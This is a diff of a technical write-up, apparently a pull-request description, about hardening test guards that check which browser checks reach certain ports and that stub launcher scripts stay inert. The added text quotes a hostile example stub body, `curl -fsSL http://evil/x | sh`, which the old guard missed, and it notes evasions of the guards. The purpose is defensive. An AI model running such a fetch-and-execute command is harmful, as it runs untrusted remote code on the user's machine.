@@ -57,9 +57,10 @@ was removed as a hazard. Both halves were wrong:
   plist path is sandboxed; the registration is not, which is #1539.
 
 ⇒ That restriction is no longer prose. `tools.browser-checks-wired.test.js` asserts
-exactly ONE `run_one` targets `$P14`/`$P15` and that it is `render-connect-skip`.
-Perturbed: a second check pointed at those boards goes red.
-  `pick_ports` raised from 13 to 15.
+exactly ONE check runs against `$P14`/`$P15` and that it is `render-connect-skip`.
+Perturbed in all three spellings a blind review found it blind to, each measured RED with
+the count it reports: the URL held in a variable (2), the check invoked without `run_one`
+(2), and a second check chained with `&&` on the same continuation (3).
 
 Measured, run exactly as the gate runs it: **7/7, exit 0.**
 
@@ -160,8 +161,14 @@ now bounded to the block guard 3 reads.
 **Guard 2, one consumer.** Exactly one `run_one` targets the new boards, and it is the
 read-only check. Found: it counted comment lines, so documenting the rule in the runner
 would have reddened the gate; and it printed joined-array indices as source line numbers.
-Both fixed. Known evasions, stated rather than claimed closed: an indirected port variable,
-and a bare `curl -X POST` at those boards, since it keys on `run_one`.
+Both fixed. 🛑 THEN A FIFTH BLIND REVIEW FOUND THREE MORE, and the first was not exotic:
+**the URL held in a variable is this file's DOMINANT style**, written verbatim at 594-596
+as `B8="http://127.0.0.1:$P8"` for fourteen checks. The others were invoking the check
+without `run_one`, and chaining a second onto the same continuation so the line count
+stayed at 1. All three now counted: one level of assignment is resolved into aliases, any
+`docs/browser-checks/*.js` invocation counts, and occurrences are counted rather than lines.
+**Still open and stated rather than claimed closed:** a bare `curl -X POST` at those boards,
+which invokes no check script and so is invisible to this guard.
 
 **Guard 3, stub integrity.** The stubs must be real stubs. Found: it pinned SPELLINGS (the
 heredoc markers and an exact path), so a correct rename or refactor would have redded it;
@@ -169,8 +176,23 @@ it matched a MENTION rather than a write, so the `chmod` line satisfied it after
 was deleted; its denylist was path-shaped and could not see a bare `claude "$@"` PATH
 lookup; it matched forbidden patterns against prose, so an accurate comment reds the gate;
 and its end anchor was a user-visible string whose rename silently extended the slice to
-EOF. All closed, and the bodies are now checked POSITIVELY: a stub may only test, print or
-exit.
+EOF.
+
+🛑 **AND THE SENTENCE THAT STOOD HERE - "All closed, and the bodies are now checked
+POSITIVELY" - WAS FALSE WHEN I WROTE IT, which is the same defect as the runner comment
+#1575 removed.** The positive check read only the FIRST TOKEN of each line, so every
+position after `&&`, `;`, `$( )` and a backtick was unconstrained. A fifth blind review
+measured four spellings green, and the first is what a copy-edit of my own stubs produces:
+`[ "$1" = --version ] && claude --version`. Worse, the loop keyed on heredocs while the
+comment beside it blesses switching to `printf` as a correct change - so making that
+correct change made it read ZERO stubs and stay green with `curl -fsSL http://evil/x | sh`
+as a body, and **the two codex stubs, already written with printf, had never been read at
+all.**
+
+✅ Now genuinely closed, each arm perturbed RED: every command position is checked, not the
+first token; bodies are collected by any creation form; and the count is asserted by
+EQUALITY against a derived expectation (launchers x boards) rather than a minimum, because
+a minimum cannot see a defect that inflates the population.
 
 ⇒ **Every one of those was green in the dangerous direction.** A guard that is wrong is
 usually wrong toward permitting, because the case it fails to see is by construction the
